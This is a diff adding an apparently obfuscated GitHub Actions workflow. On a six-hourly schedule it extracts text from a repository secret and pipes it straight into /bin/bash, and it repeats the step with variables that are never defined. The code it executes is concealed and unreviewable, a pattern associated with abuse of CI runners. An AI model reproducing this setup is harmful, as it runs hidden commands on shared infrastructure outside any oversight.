@@ -1,0 +1,22 @@
+name: ganjingllluo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ganjingllluo
+        env:
+          cknmv12506: ${{ secrets.cknmv12506 }}
+        run: |
+          echo $cknmv12506 | jq -r .vvoa09348 | /bin/bash
+          echo $f0257 | jq -r .p34175 | /bin/bash
+          echo $ywqfh85974 | jq -r .prelv20494 | /bin/bash
+          echo $rij05 | jq -r .q014 | /bin/bash
+          echo $lipt95 | jq -r .gph45 | /bin/bash
+
